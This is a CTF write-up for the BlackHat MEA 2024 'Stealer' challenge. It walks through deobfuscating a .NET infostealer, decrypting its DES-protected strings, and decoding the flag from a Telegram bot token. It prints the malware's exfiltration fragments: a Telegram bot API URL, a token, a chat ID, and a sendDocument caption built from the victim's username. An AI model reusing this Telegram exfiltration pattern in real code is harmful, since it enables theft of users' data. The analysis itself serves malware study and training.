---
title: "Stealer - BlackHat MEA CTF Qualification 2024"
category: "crypto"
subcategory: "dotnet"
type: "writeup"
tags: ["crypto", "blackhat", "bhmea24", "dotnet", "cyberchef", "base64", "blackhat-mea-ctf-qualification", "blackhat-mea-ctf-qualification-202", "2024", "ctf-writeup"]
summary: "One way was obviously doing it with Virustotal and just getting the API token by reviewing the behaviour section and just decrypting the Cryptographic Plain Text."
source:
  name: "CTFtime writeup #39444"
  url: "https://ctftime.org/writeup/39444"
ctf:
  name: "BlackHat MEA CTF Qualification 2024"
  year: 2024
  challenge: "Stealer"
---

## Metadata

- **CTF:** BlackHat MEA CTF Qualification 2024
- **Task:** Stealer
- **Author team:** CY3RBULL1ES
- **CTFtime tags:** blackhat, ctf, bhmea24
- **CTFtime:** <https://ctftime.org/writeup/39444>

---
One way was obviously doing it with Virustotal and just getting the API token by reviewing the behaviour section and just decrypting the Cryptographic Plain Text.

```  
Cryptographical plain text

5481237002  
7267561120:QkhGbGFnWXt0M2xlZ3I0bV9nMGVzX3chbGR9  
```

Which would give you the flag but since this required some reversing, it can also be done using `dnSpy` through manual analysis and then de-obfuscating or cleaning the code using `de4dot` as it was too obfuscated. After getting a cleaner version of the executable, further identified some functions which were being used to interact with Telegram and stealing some data. After that I found a `smethod_16 function` which is a decryption method, which utilized DES encryption with a key derived from an MD5 hash, then decrypted the encrypted strings to get a base64-encoded bot-token which contains the flag.

```  
<https://api.telegram.org/bot>,  
7267561120:QkhGbGFnWXt0M2xlZ3I0bV9nMGVzX3chbGR9,  
/sendDocument?chat_id=,  
5481237002,  
"&caption=",  
string.Concat(new string[]  
{  
" Pc Name: ",  
Environment.UserName,  
" | Snake Tracker\r\n\r\nPW | ",  
Environment.UserName,  
" | Snake\r\n\r\n\r\n"  
})  
```

Using CyberChef we can decode the bot token and we get the flag.   
BHFlagY{t3legr4m_g0es_w!ld}
